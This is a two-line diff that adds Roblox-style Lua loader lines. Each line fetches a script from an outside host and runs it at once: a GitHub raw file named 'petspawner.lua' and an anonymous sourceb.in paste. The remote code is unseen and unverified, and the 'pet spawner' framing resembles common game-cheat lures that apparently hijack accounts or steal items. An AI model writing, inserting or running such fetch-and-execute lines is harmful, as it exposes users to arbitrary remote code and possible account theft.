@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryikazu/loader/refs/heads/main/petspawner.lua"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pZ6FnQSKf1/0", true))()
